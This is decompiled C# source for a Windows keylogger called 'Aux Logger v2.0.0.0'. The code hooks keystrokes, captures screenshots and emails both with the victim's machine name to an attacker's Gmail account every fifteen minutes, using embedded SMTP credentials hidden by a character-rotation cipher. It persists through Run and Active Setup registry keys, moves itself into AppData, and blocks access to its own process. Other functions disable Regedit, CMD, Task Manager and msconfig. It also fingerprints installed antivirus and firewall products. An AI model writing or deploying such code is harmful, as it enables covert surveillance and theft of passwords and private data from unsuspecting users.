using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Dark;

public class MainCore : ApplicationContext
{
	public enum INSTALL_PATH
	{
		AppData,
		System32,
		ProgramFiles,
		Temp,
		Local,
		MyDocuments
	}

	private const int rotateint = 5;

	private const string @string = "j_\\]`mdjqj;bh\\dg)^jh";

	private const int int32 = 900000;

	private const string password = "hpc\\h`_,";

	public static Timer SendLogTimer = new Timer();

	public static KeyBoardHook Keyboard;

	public MainCore(params string[] args)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		InitializeMutex("4,75411703081161E+16");
		Keyboard = new KeyBoardHook();
		DisableRegedit();
		StartOnWindows(Assembly.GetExecutingAssembly().Location);
		Install(INSTALL_PATH.AppData);
		ProtectProcess();
		new ComputerInfo();
		StringBuilder stringBuilder = new StringBuilder();
		new WebClient();
		stringBuilder.AppendLine("[=========\\\\ Aux Logger v2.0.0.0 //=========]");
		Upload(stringBuilder.ToString());
		SendLogTimer.add_Tick((EventHandler)SendLogs);
		SendLogTimer.set_Interval(900000);
		SendLogTimer.Start();
		Keyboard.Start();
	}

	private static void InitializeMutex(string Mutex)
	{
		new Mutex(initiallyOwned: false, Mutex);
	}

	public static void DisableCMD()
	{
		try
		{
			Registry.SetValue(NativeMethods.RotateRight("CF@TZ>PMM@IOZPN@MWNjaor\\m`WKjgd^d`nWHd^mjnjaoWRdi_jrnWNtno`h"), NativeMethods.RotateRight("?dn\\]g`>H?"), "1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void DisableTaskMan()
	{
		RegistryKey registryKey = Registry.CurrentUser;
		try
		{
			registryKey = registryKey.CreateSubKey(NativeMethods.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"));
			registryKey.SetValue(NativeMethods.RotateRight("?dn\\]g`O\\nfHbm"), 1);
			registryKey.Close();
			registryKey = Registry.CurrentUser;
			registryKey = registryKey.OpenSubKey(NativeMethods.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"));
			registryKey.SetValue(NativeMethods.RotateRight("?dn\\]g`O\\nfHbm"), 1, RegistryValueKind.DWord);
			File.Delete(Path.Combine(Environment.SystemDirectory, NativeMethods.RotateRight("o\\nfhbm)`s`")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			registryKey.Close();
		}
	}

	public static void DisableRegedit()
	{
		try
		{
			Registry.SetValue(NativeMethods.RotateRight("CF@TZ>PMM@IOZPN@MWNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"), NativeMethods.RotateRight("?dn\\]g`M`bdnomtOjjgn"), "1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void DisableMSConfig()
	{
		RegistryKey registryKey = Registry.CurrentUser;
		try
		{
			registryKey = registryKey.CreateSubKey(NativeMethods.RotateRight("WNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nW@skgjm`mW?dn\\ggjrMpi"));
			registryKey = registryKey.OpenSubKey(NativeMethods.RotateRight("WNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nW@skgjm`mW?dn\\ggjrMpi"));
			registryKey.SetValue(NativeMethods.RotateRight("HN>jiadb"), 1, RegistryValueKind.String);
			File.Delete(Path.Combine(Environment.SystemDirectory, NativeMethods.RotateRight("hn^jiadb)`s`")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			registryKey.Close();
		}
	}

	public static void SendLogs(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(NativeMethods.log.Trim(), "", false) != 0)
			{
				Upload(NativeMethods.log);
				NativeMethods.log = "";
			}
			else
			{
				NativeMethods.log = NativeMethods.RotateRight("V>JHKPO@M\u001b>PMM@IOGT\u001bD?G@?X\u001bV") + Conversions.ToString(DateTime.Now) + "]";
				Upload(NativeMethods.log);
				NativeMethods.log = "";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Upload(string content)
	{
		try
		{
			Stream contentStream = ToStream(SaveScreen(), ImageFormat.get_Jpeg());
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(NativeMethods.RotateRight("j_\\]`mdjqj;bh\\dg)^jh"), NativeMethods.RotateRight("hpc\\h`_,"));
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(NativeMethods.RotateRight("j_\\]`mdjqj;bh\\dg)^jh"));
			mailMessage.To.Add(NativeMethods.RotateRight("j_\\]`mdjqj;gdq`)^jh"));
			mailMessage.Subject = "Aux Logger - You got Logs! - PC: " + Environment.UserDomainName;
			mailMessage.Body = content;
			new ContentType("image/jpeg");
			mailMessage.Attachments.Add(new Attachment(contentStream, NativeMethods.RotateRight("N^m``incjo)ek`b")));
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static Bitmap SaveScreen()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		Bitmap val = new Bitmap(bounds.Width, bounds.Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Size size = new Size(bounds.Width, bounds.Height);
		val2.CopyFromScreen(0, 0, 0, 0, size);
		val2.Dispose();
		return val;
	}

	public static Stream ToStream(Bitmap image, ImageFormat formaw)
	{
		MemoryStream memoryStream = new MemoryStream();
		((Image)image).Save((Stream)memoryStream, formaw);
		memoryStream.Position = 0L;
		return memoryStream;
	}

	public static void Install(INSTALL_PATH Path, string UserDefined = "NULL")
	{
		try
		{
			switch (Path)
			{
			case INSTALL_PATH.AppData:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				break;
			case INSTALL_PATH.System32:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.System);
				break;
			case INSTALL_PATH.ProgramFiles:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
				break;
			case INSTALL_PATH.Temp:
				UserDefined = Environment.GetEnvironmentVariable("Temp");
				break;
			case INSTALL_PATH.Local:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				break;
			case INSTALL_PATH.MyDocuments:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				break;
			}
			string path = UserDefined;
			UserDefined = System.IO.Path.Combine(UserDefined, System.IO.Path.GetFileName(Assembly.GetExecutingAssembly().Location));
			string empty = string.Empty;
			if (Operators.CompareString(UserDefined, Assembly.GetExecutingAssembly().Location, false) == 0)
			{
				return;
			}
			empty = Assembly.GetExecutingAssembly().Location;
			string[] commandLineArgs = Environment.GetCommandLineArgs();
			for (int i = 0; i < commandLineArgs.Length; i++)
			{
				string path2 = commandLineArgs[i];
				if (Operators.CompareString(path2, empty, false) != 0)
				{
					NativeMethods.DeleteFileA(ref path2);
				}
			}
			empty = Assembly.GetExecutingAssembly().Location;
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			NativeMethods.MoveFileEx(empty, UserDefined, 2);
			Process.Start(UserDefined, empty);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void StartOnWindows(string location)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey(NativeMethods.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWMpi"), writable: true);
			registryKey.SetValue(NativeMethods.RotateRight("[p28]"), location, RegistryValueKind.String);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			RegistryKey registryKey2 = localMachine.OpenSubKey(NativeMethods.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWMpi"), writable: true);
			registryKey2.SetValue(NativeMethods.RotateRight("[p28]"), location, RegistryValueKind.String);
			registryKey2.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.SetValue(NativeMethods.RotateRight("CF@TZGJ><GZH<>CDI@WNJAOR<M@WHd^mjnjaoW<^odq`\u001bN`opkWDino\\gg`_\u001b>jhkji`ionW") + Guid.NewGuid(), "stubpath", location, RegistryValueKind.String);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void FakeMessageBox()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxIcon val = (MessageBoxIcon)0;
		string text = "[p16]";
		if (string.IsNullOrEmpty(text) | (Operators.CompareString(text, (string)null, false) == 0) | (Operators.CompareString(text, string.Empty, false) == 0))
		{
			text = " ";
		}
		MessageBox.Show(text, "[p18]", (MessageBoxButtons)0, val);
	}

	public static void ProtectProcess()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RawSecurityDescriptor processSecurityDescriptor = default(RawSecurityDescriptor);
		IntPtr currentProcess = default(IntPtr);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 114:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001a;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001a:
					num = 4;
					processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
					break;
					IL_0007:
					num = 2;
					currentProcess = NativeMethods.GetCurrentProcess();
					goto IL_0010;
					IL_0010:
					num = 3;
					processSecurityDescriptor = NativeMethods.GetProcessSecurityDescriptor(currentProcess);
					goto IL_001a;
					end_IL_0000_2:
					break;
				}
				num = 5;
				NativeMethods.SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 114;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string GetFramework()
	{
		string text = string.Empty;
		try
		{
			string name = NativeMethods.RotateRight("NJAOR<M@WHd^mjnjaoW<^odq`\u001bN`opkWDino\\gg`_\u001b>jhkji`ion");
			string empty = string.Empty;
			string empty2 = string.Empty;
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			string[] array = subKeyNames;
			foreach (string name2 in array)
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
				empty2 = (string)registryKey2.GetValue(null);
				if (empty2 != null && empty2.IndexOf(".NET Framework") >= 0)
				{
					empty = (string)registryKey2.GetValue("Version");
					if (!text.Contains(Conversions.ToString(empty[0])))
					{
						text = text + Conversions.ToString(empty[0]) + ", ";
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Unknown";
			ProjectData.ClearProjectError();
			return result;
		}
		return text.Remove(text.Length - 2);
	}

	public static string GetProcessor()
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject(NativeMethods.RotateRight("rdihbhon5"), (string)null));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "InstancesOf", new object[1] { "Win32_Processor" }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				if (enumerator.MoveNext())
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					return Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return "Unknown Processor";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "No Processor was found";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetOS()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		string[] array = new string[0];
		object obj = (object)new ManagementObjectSearcher(NativeMethods.RotateRight("N@G@>O\u001b%\u001bAMJH\u001bRdi.-ZJk`m\\odibNtno`h"));
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Get", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				array = NewLateBinding.LateIndexGet(objectValue, new object[1] { "name" }, (string[])null).ToString()!.Split(new char[1] { '|' });
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return Conversions.ToString(Interaction.IIf(array[0] != null, (object)array[0], (object)"Unknown"));
	}

	public static string GetFirewall()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		string result = "None";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + NativeMethods.RotateRight("WmjjoWN`^pmdot>`io`m-"), NativeMethods.RotateRight("N@G@>O\u001b%\u001bAMJH\u001bAdm`r\\ggKmj_p^o"));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item(NativeMethods.RotateRight("_dnkg\\tI\\h`")).ToString();
				}
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetAntivirus()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			string machineName = Environment.MachineName;
			string text2 = Conversions.ToString(Interaction.IIf(Environment.OSVersion.Version.Major > 5, (object)("\\\\" + machineName + NativeMethods.RotateRight("WmjjoWN`^pmdot>`io`m-")), (object)("\\\\" + machineName + NativeMethods.RotateRight("WmjjoWN`^pmdot>`io`m"))));
			ManagementObjectSearcher val = new ManagementObjectSearcher(text2, NativeMethods.RotateRight("N@G@>O\u001b%\u001bAMJH\u001b<iodqdmpnKmj_p^o"));
			ManagementObjectCollection val2 = val.Get();
			string text3 = NativeMethods.RotateRight("<iodqdmpn`n\u001b#") + val2.get_Count() + "):\r\n";
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					try
					{
						text3 = Conversions.ToString(Operators.AddObject((object)text3, Operators.ConcatenateObject(((ManagementBaseObject)val3).get_Item(NativeMethods.RotateRight("^jhk\\itI\\h`")), (object)" - ")));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						text3 = Conversions.ToString(Operators.ConcatenateObject((object)text3, Operators.ConcatenateObject(Operators.ConcatenateObject(((ManagementBaseObject)val3).get_Item("displayName"), (object)"\r"), (object)"\n")));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			text = text3;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (text.Contains(":"))
		{
			text = text.Split(new char[1] { ':' })[1].TrimStart(new char[0]).TrimEnd(new char[0]);
		}
		return text;
	}
}
